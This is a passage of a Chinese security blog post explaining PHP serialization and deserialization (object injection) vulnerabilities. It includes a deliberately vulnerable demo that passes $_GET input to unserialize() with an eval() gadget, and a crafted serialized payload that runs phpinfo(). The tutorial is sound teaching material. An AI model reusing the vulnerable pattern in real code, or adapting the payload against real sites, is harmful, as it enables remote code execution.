@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>PHP反序列化研究 - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="什么是序列化与反序列化 序列化的概念 将对象或者数组转化为可存储的字符串。
+在PHP中使用serialize()函数来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。
+我们使用类的序列化比较多，所以这里就用一个序列化对象的例子来演示：
+&amp;lt;?php #创建一个类 class test{ public $a = &amp;#39;sdfsdfa&amp;#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&amp;gt;a; } } $d = new test(); //实例化对象 $d = serialize($d);//序列化对象 var_dump($d);//输出序列化后的结果 ?&amp;gt;运行的结果：
+string(73) &amp;#34;O:4:&amp;#34;test&amp;#34;:3:{s:1:&amp;#34;a&amp;#34;;s:7:&amp;#34;sdfsdfa&amp;#34;;s:4:&amp;#34;\000*\000b&amp;#34;;i:1111;s:7:&amp;#34;\000test\000c&amp;#34;;b:0;}&amp;#34; 我们从头开始分析各个部分的数组代表着什么：
+O:4:&amp;ldquo;test&amp;rdquo;:3 O代表是对象类型，如果是a那就是数组类型;4是对象名称的长度，test是对象名称，3代表是有3个成员。
+s:1:&amp;ldquo;a&amp;rdquo;;s:7:&amp;ldquo;sdfsdfa&amp;rdquo; 第一个s代表变量名称是字符串类型，a是变量名称；第二个s代表变量值是字符串类型，7是变量值得长度，后面是变量的值。
+s:4:&amp;quot;\000\000b&amp;quot;;i:1111* 这里的字符串不应该是1吗？为什么是4呢，而且还多了一些字符。我们看到成员变量b的属性是protected；
+protected属性序列化的时候格式是 %00%00成员名 ；*
+一个%00代表一个字节，所以protected有两个%00，再加上*和变量名称长度一共是4个字节；
+接下来的i代表变量数值是整数型。
+s:7:&amp;quot;\000test\000c&amp;quot;;b:0 这里也出现了%00字符而且还多了类的名称，为什么呢？我们看到成员变量c的属性是private；
+private属性序列化的时候格式是 %00类名%00成员名；
+这里也是有两个%002个字节加上类名的4个字节和变量名一个字节，加起来就是7个字节；
+下面的b代表着变量值是布尔型。
+大家在这里有发现对象序列化后为什么方法没有跟着一起序列化呢？
+因为serialize()函数只对类的属性序列化，不序列化方法。
+反序列化的概念 将序列化后的字符串转换回对象或者数组。
+在PHP中使用unserialize()函数来将序列化后的字符串转换回PHP的值，并返回的值可为 integer、float、string、array 或 object类型。
+我们重新用上面的例子并把序列化的结果写入一个文本中存储：
+&amp;lt;?php class test{ public $a = &amp;#39;sdfsdfa&amp;#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&amp;gt;a; } } $d = new test(); $d = serialize($d); file_put_contents(&amp;#39;1." /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+  <meta name="referrer" content="no-referrer" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="PHP反序列化研究" />
+<meta property="og:description" content="什么是序列化与反序列化 序列化的概念 将对象或者数组转化为可存储的字符串。
+在PHP中使用serialize()函数来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。
+我们使用类的序列化比较多，所以这里就用一个序列化对象的例子来演示：
+&lt;?php #创建一个类 class test{ public $a = &#39;sdfsdfa&#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&gt;a; } } $d = new test(); //实例化对象 $d = serialize($d);//序列化对象 var_dump($d);//输出序列化后的结果 ?&gt;运行的结果：
+string(73) &#34;O:4:&#34;test&#34;:3:{s:1:&#34;a&#34;;s:7:&#34;sdfsdfa&#34;;s:4:&#34;\000*\000b&#34;;i:1111;s:7:&#34;\000test\000c&#34;;b:0;}&#34; 我们从头开始分析各个部分的数组代表着什么：
+O:4:&ldquo;test&rdquo;:3 O代表是对象类型，如果是a那就是数组类型;4是对象名称的长度，test是对象名称，3代表是有3个成员。
+s:1:&ldquo;a&rdquo;;s:7:&ldquo;sdfsdfa&rdquo; 第一个s代表变量名称是字符串类型，a是变量名称；第二个s代表变量值是字符串类型，7是变量值得长度，后面是变量的值。
+s:4:&quot;\000\000b&quot;;i:1111* 这里的字符串不应该是1吗？为什么是4呢，而且还多了一些字符。我们看到成员变量b的属性是protected；
+protected属性序列化的时候格式是 %00%00成员名 ；*
+一个%00代表一个字节，所以protected有两个%00，再加上*和变量名称长度一共是4个字节；
+接下来的i代表变量数值是整数型。
+s:7:&quot;\000test\000c&quot;;b:0 这里也出现了%00字符而且还多了类的名称，为什么呢？我们看到成员变量c的属性是private；
+private属性序列化的时候格式是 %00类名%00成员名；
+这里也是有两个%002个字节加上类名的4个字节和变量名一个字节，加起来就是7个字节；
+下面的b代表着变量值是布尔型。
+大家在这里有发现对象序列化后为什么方法没有跟着一起序列化呢？
+因为serialize()函数只对类的属性序列化，不序列化方法。
+反序列化的概念 将序列化后的字符串转换回对象或者数组。
+在PHP中使用unserialize()函数来将序列化后的字符串转换回PHP的值，并返回的值可为 integer、float、string、array 或 object类型。
+我们重新用上面的例子并把序列化的结果写入一个文本中存储：
+&lt;?php class test{ public $a = &#39;sdfsdfa&#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&gt;a; } } $d = new test(); $d = serialize($d); file_put_contents(&#39;1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/research-on-php-deserialization/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-06-01T13:20:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-06-01T13:20:00&#43;00:00" />
+
+<meta itemprop="name" content="PHP反序列化研究">
+<meta itemprop="description" content="什么是序列化与反序列化 序列化的概念 将对象或者数组转化为可存储的字符串。
+在PHP中使用serialize()函数来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。
+我们使用类的序列化比较多，所以这里就用一个序列化对象的例子来演示：
+&lt;?php #创建一个类 class test{ public $a = &#39;sdfsdfa&#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&gt;a; } } $d = new test(); //实例化对象 $d = serialize($d);//序列化对象 var_dump($d);//输出序列化后的结果 ?&gt;运行的结果：
+string(73) &#34;O:4:&#34;test&#34;:3:{s:1:&#34;a&#34;;s:7:&#34;sdfsdfa&#34;;s:4:&#34;\000*\000b&#34;;i:1111;s:7:&#34;\000test\000c&#34;;b:0;}&#34; 我们从头开始分析各个部分的数组代表着什么：
+O:4:&ldquo;test&rdquo;:3 O代表是对象类型，如果是a那就是数组类型;4是对象名称的长度，test是对象名称，3代表是有3个成员。
+s:1:&ldquo;a&rdquo;;s:7:&ldquo;sdfsdfa&rdquo; 第一个s代表变量名称是字符串类型，a是变量名称；第二个s代表变量值是字符串类型，7是变量值得长度，后面是变量的值。
+s:4:&quot;\000\000b&quot;;i:1111* 这里的字符串不应该是1吗？为什么是4呢，而且还多了一些字符。我们看到成员变量b的属性是protected；
+protected属性序列化的时候格式是 %00%00成员名 ；*
+一个%00代表一个字节，所以protected有两个%00，再加上*和变量名称长度一共是4个字节；
+接下来的i代表变量数值是整数型。
+s:7:&quot;\000test\000c&quot;;b:0 这里也出现了%00字符而且还多了类的名称，为什么呢？我们看到成员变量c的属性是private；
+private属性序列化的时候格式是 %00类名%00成员名；
+这里也是有两个%002个字节加上类名的4个字节和变量名一个字节，加起来就是7个字节；
+下面的b代表着变量值是布尔型。
+大家在这里有发现对象序列化后为什么方法没有跟着一起序列化呢？
+因为serialize()函数只对类的属性序列化，不序列化方法。
+反序列化的概念 将序列化后的字符串转换回对象或者数组。
+在PHP中使用unserialize()函数来将序列化后的字符串转换回PHP的值，并返回的值可为 integer、float、string、array 或 object类型。
+我们重新用上面的例子并把序列化的结果写入一个文本中存储：
+&lt;?php class test{ public $a = &#39;sdfsdfa&#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&gt;a; } } $d = new test(); $d = serialize($d); file_put_contents(&#39;1."><meta itemprop="datePublished" content="2021-06-01T13:20:00&#43;00:00" />
+<meta itemprop="dateModified" content="2021-06-01T13:20:00&#43;00:00" />
+<meta itemprop="wordCount" content="902">
+<meta itemprop="keywords" content="PHP反序列化," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PHP反序列化研究"/>
+<meta name="twitter:description" content="什么是序列化与反序列化 序列化的概念 将对象或者数组转化为可存储的字符串。
+在PHP中使用serialize()函数来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。
+我们使用类的序列化比较多，所以这里就用一个序列化对象的例子来演示：
+&lt;?php #创建一个类 class test{ public $a = &#39;sdfsdfa&#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&gt;a; } } $d = new test(); //实例化对象 $d = serialize($d);//序列化对象 var_dump($d);//输出序列化后的结果 ?&gt;运行的结果：
+string(73) &#34;O:4:&#34;test&#34;:3:{s:1:&#34;a&#34;;s:7:&#34;sdfsdfa&#34;;s:4:&#34;\000*\000b&#34;;i:1111;s:7:&#34;\000test\000c&#34;;b:0;}&#34; 我们从头开始分析各个部分的数组代表着什么：
+O:4:&ldquo;test&rdquo;:3 O代表是对象类型，如果是a那就是数组类型;4是对象名称的长度，test是对象名称，3代表是有3个成员。
+s:1:&ldquo;a&rdquo;;s:7:&ldquo;sdfsdfa&rdquo; 第一个s代表变量名称是字符串类型，a是变量名称；第二个s代表变量值是字符串类型，7是变量值得长度，后面是变量的值。
+s:4:&quot;\000\000b&quot;;i:1111* 这里的字符串不应该是1吗？为什么是4呢，而且还多了一些字符。我们看到成员变量b的属性是protected；
+protected属性序列化的时候格式是 %00%00成员名 ；*
+一个%00代表一个字节，所以protected有两个%00，再加上*和变量名称长度一共是4个字节；
+接下来的i代表变量数值是整数型。
+s:7:&quot;\000test\000c&quot;;b:0 这里也出现了%00字符而且还多了类的名称，为什么呢？我们看到成员变量c的属性是private；
+private属性序列化的时候格式是 %00类名%00成员名；
+这里也是有两个%002个字节加上类名的4个字节和变量名一个字节，加起来就是7个字节；
+下面的b代表着变量值是布尔型。
+大家在这里有发现对象序列化后为什么方法没有跟着一起序列化呢？
+因为serialize()函数只对类的属性序列化，不序列化方法。
+反序列化的概念 将序列化后的字符串转换回对象或者数组。
+在PHP中使用unserialize()函数来将序列化后的字符串转换回PHP的值，并返回的值可为 integer、float、string、array 或 object类型。
+我们重新用上面的例子并把序列化的结果写入一个文本中存储：
+&lt;?php class test{ public $a = &#39;sdfsdfa&#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&gt;a; } } $d = new test(); $d = serialize($d); file_put_contents(&#39;1."/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">PHP反序列化研究</h1>
+        <p class="post-meta">Jun 01, 2021</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h1 id="什么是序列化与反序列化">什么是序列化与反序列化</h1>
+<h2 id="序列化的概念">序列化的概念</h2>
+<p><strong>将对象或者数组转化为可存储的字符串。</strong></p>
+<p>在PHP中使用serialize()函数来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。</p>
+<p>我们使用类的序列化比较多，所以这里就用一个序列化对象的例子来演示：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="c1">#创建一个类
+</span><span class="c1"></span><span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;sdfsdfa&#39;</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="mi">1111</span><span class="p">;</span>
+    <span class="k">private</span>  <span class="nv">$c</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">displayVar</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$d</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span> <span class="c1">//实例化对象
+</span><span class="c1"></span><span class="nv">$d</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span><span class="c1">//序列化对象
+</span><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span><span class="c1">//输出序列化后的结果
+</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>运行的结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">string</span><span class="p">(</span><span class="mi">73</span><span class="p">)</span> <span class="s2">&#34;O:4:&#34;</span><span class="nx">test</span><span class="s2">&#34;:3:{s:1:&#34;</span><span class="nx">a</span><span class="s2">&#34;;s:7:&#34;</span><span class="nx">sdfsdfa</span><span class="s2">&#34;;s:4:&#34;</span><span class="nx">\000</span><span class="o">*</span><span class="nx">\000b</span><span class="s2">&#34;;i:1111;s:7:&#34;</span><span class="nx">\000test\000c</span><span class="s2">&#34;;b:0;}&#34;</span>
+</code></pre></div><p>我们从头开始分析各个部分的数组代表着什么：</p>
+<p><strong>O:4:&ldquo;test&rdquo;:3</strong> O代表是对象类型，如果是a那就是数组类型;4是对象名称的长度，test是对象名称，3代表是有3个成员。</p>
+<p><strong>s:1:&ldquo;a&rdquo;;s:7:&ldquo;sdfsdfa&rdquo;</strong> 第一个s代表变量名称是字符串类型，a是变量名称；第二个s代表变量值是字符串类型，7是变量值得长度，后面是变量的值。</p>
+<p><em><em>s:4:&quot;\000</em>\000b&quot;;i:1111</em>* 这里的字符串不应该是1吗？为什么是4呢，而且还多了一些字符。我们看到成员变量b的属性是protected；</p>
+<p><em>protected属性序列化的时候格式是 %00</em>%00成员名 ；*</p>
+<p>一个%00代表一个字节，所以protected有两个%00，再加上*和变量名称长度一共是4个字节；</p>
+<p>接下来的i代表变量数值是整数型。</p>
+<p><strong>s:7:&quot;\000test\000c&quot;;b:0</strong> 这里也出现了%00字符而且还多了类的名称，为什么呢？我们看到成员变量c的属性是private；</p>
+<p><em>private属性序列化的时候格式是 %00类名%00成员名；</em></p>
+<p>这里也是有两个%002个字节加上类名的4个字节和变量名一个字节，加起来就是7个字节；</p>
+<p>下面的b代表着变量值是布尔型。</p>
+<p>大家在这里有发现对象序列化后为什么方法没有跟着一起序列化呢？</p>
+<p><strong>因为serialize()函数只对类的属性序列化，不序列化方法。</strong></p>
+<h2 id="反序列化的概念">反序列化的概念</h2>
+<p><strong>将序列化后的字符串转换回对象或者数组。</strong></p>
+<p>在PHP中使用unserialize()函数来将序列化后的字符串转换回PHP的值，并返回的值可为 integer、float、string、array 或 object类型。</p>
+<p>我们重新用上面的例子并把序列化的结果写入一个文本中存储：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;sdfsdfa&#39;</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="mi">1111</span><span class="p">;</span>
+    <span class="k">private</span>  <span class="nv">$c</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">displayVar</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$d</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
+<span class="nv">$d</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
+<span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>我们重新写一个文件，读取刚才存储的文本内容并对内容进行反序列化：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="nv">$d</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">));</span>
+<span class="nx">print_r</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>大家觉得输出的结果是打印出类的对象和成员变量$a的值对吗？并不是：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">__PHP_Incomplete_Class</span> <span class="nx">Object</span>
+<span class="p">(</span>
+    <span class="p">[</span><span class="nx">__PHP_Incomplete_Class_Name</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">test</span>
+    <span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">sdfsdfa</span>
+    <span class="p">[</span><span class="nx">b</span><span class="o">:</span><span class="k">protected</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1111</span>
+    <span class="p">[</span><span class="nx">c</span><span class="o">:</span><span class="nx">test</span><span class="o">:</span><span class="k">private</span><span class="p">]</span> <span class="o">=&gt;</span> 
+<span class="p">)</span>
+</code></pre></div><p><strong>在反序列化的时候要保证有该类存在，因为没有序列化方法，所以我们反序列化回来还要依靠该类的方法进行。</strong></p>
+<p>所以反序列化的写法如下：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;sdfsdfa&#39;</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="mi">1111</span><span class="p">;</span>
+    <span class="k">private</span>  <span class="nv">$c</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">displayVar</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$d</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">));</span>
+<span class="nx">print_r</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$d</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>最终输出的结果：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">test</span> <span class="nx">Object</span>
+<span class="p">(</span>
+    <span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">sdfsdfa</span>
+    <span class="p">[</span><span class="nx">b</span><span class="o">:</span><span class="k">protected</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1111</span>
+    <span class="p">[</span><span class="nx">c</span><span class="o">:</span><span class="nx">test</span><span class="o">:</span><span class="k">private</span><span class="p">]</span> <span class="o">=&gt;</span> 
+<span class="p">)</span>
+<span class="nx">sdfsdfa</span>
+</code></pre></div><p><strong>为什么要序列化对象成字符串呢？在开发中又起到什么作用？</strong></p>
+<p>序列化作用：方便传输、方便存储。</p>
+<p>因为PHP文件执行后会把内存的数据进行销毁，如果下一个文件想用到刚刚销毁对象的属性和值就还要重新实例化new一次对象，所以才会将对象进行序列化然后存储，也避免重新实例化带来的耗费。开发中比较好举例就是session，PHP中如果使用php_serialize引擎，那么存储session文件将以序列化的方式存储在文件中，当我们要验证当前用户是否有权限进入该页面时就需要反序列化读取存储在服务器上面的session文件的值来判断。</p>
+<h1 id="反序列化漏洞的产生">反序列化漏洞的产生</h1>
+<p>为什么有反序列化的漏洞呢？之前反序列化还不是很火，直到PHP的伪协议phar://的反序列化开始。</p>
+<p>用k0rz3n师傅解释很清晰了：</p>
+<blockquote>
+<p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，是因为程序对输入数据处理不当导致的.
+反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p>
+</blockquote>
+<p>一句话讲晒就是： <strong>反序列化漏洞是由于unserialize函数接收到了恶意的序列化数据篡改成员属性后导致的。</strong></p>
+<h2 id="小试牛刀">小试牛刀</h2>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">index</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$test</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">normal</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">normal</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
+        <span class="k">echo</span> <span class="s2">&#34;please attack me&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">evil</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$test2</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">action</span><span class="p">(){</span>
+        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;test&#39;</span><span class="p">]);</span>
+</code></pre></div><p>我们可以看到正常实例化后会执行<strong>normal</strong>类里面的<strong>action</strong>方法，但是unserialize函数是可控的，我们就可以对其进行攻击，思路就是改变<strong>index</strong>类里面test属性的值，让它实例化evil类，从而执行evil里面的action方法，同时我们也要修改evil类里面的test2属性的值。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">index</span> <span class="p">{</span>
+    <span class="k">private</span> <span class="nv">$test</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">evil</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">evil</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$test2</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$a</span><span class="o">=</span> <span class="k">new</span> <span class="nx">index</span><span class="p">();</span>
+<span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;serialize1.txt&#39;</span><span class="p">,</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</code></pre></div><p>我们把修改过后序列化的提交给test参数：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;index&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span><span class="s2">&#34;%00index%00test&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;evil&#34;</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;test2&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="s2">&#34;phpinfo();&#34;</span><span class="p">;}}</span>
+</code></pre></div><p>有人可能有疑问了，为什么这里就一句<strong>unserialize($_GET[&lsquo;test&rsquo;])</strong>，没有实例化的语句，那是怎么执行了语句？</p>
+<p>每一次的反序列化都会自动触发一些魔术方法，比如上面例子的**__destruct，**执行反序列化会自动触发里面的方法。但__construct就不能，为什么呢？因为序列化本身就是存储一个已经初始化的的对象的值了, 所以没必要去执行__construct,或者说序列化过程本身没有创建对象这一过程。</p>
+<h2 id="php魔术方法">PHP魔术方法</h2>
+<p>PHP讲以双下划线__保留为魔术方法，所有的魔术方法 必须 声明为 public。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">__construct</span><span class="p">()</span><span class="nx">，类的构造函数</span>
+
+<span class="nx">__destruct</span><span class="p">()</span><span class="nx">，类的析构函数</span>
+
+<span class="nx">__call</span><span class="p">()</span><span class="nx">，在对象中调用一个不可访问方法时调用</span>
+
+<span class="nx">__callStatic</span><span class="p">()</span><span class="nx">，用静态方式中调用一个不可访问方法时调用</span>
+
+<span class="nx">__get</span><span class="p">()</span><span class="nx">，获得一个类的成员变量时调用</span>
+
+<span class="nx">__set</span><span class="p">()</span><span class="nx">，设置一个类的成员变量时调用</span>
+
+<span class="nx">__isset</span><span class="p">()</span><span class="nx">，当对不可访问属性调用isset</span><span class="p">()</span><span class="nx">或empty</span><span class="p">()</span><span class="nx">时调用</span>
+
+<span class="nx">__unset</span><span class="p">()</span><span class="nx">，当对不可访问属性调用unset</span><span class="p">()</span><span class="nx">时被调用。</span>
+
+<span class="nx">__sleep</span><span class="p">()</span><span class="nx">，执行serialize</span><span class="p">()</span><span class="nx">时，先会调用这个函数</span>
+
+<span class="nx">__wakeup</span><span class="p">()</span><span class="nx">，执行unserialize</span><span class="p">()</span><span class="nx">时，先会调用这个函数</span>
+
+<span class="nx">__toString</span><span class="p">()</span><span class="nx">，类被当成字符串时的回应方法</span>
+
+<span class="nx">__invoke</span><span class="p">()</span><span class="nx">，调用函数的方式调用一个对象时的回应方法</span>
+
+<span class="nx">__set_state</span><span class="p">()</span><span class="nx">，调用var_export</span><span class="p">()</span><span class="nx">导出类时，此静态方法会被调用。</span>
+
+<span class="nx">__clone</span><span class="p">()</span><span class="nx">，当对象复制完成时调用</span>
+
+<span class="nx">__autoload</span><span class="p">()</span><span class="nx">，尝试加载未定义的类</span>
+
+<span class="nx">__debugInfo</span><span class="p">()</span><span class="nx">，打印所需调试信息</span>
+</code></pre></div><h3 id="__construct">__construct()</h3>
+<p>**__construct()**被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在序列化和反序列化过程是不会触发的。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+
+    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&#34;__construct test&#34;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+<span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;F0rmat&#34;</span><span class="p">);</span>
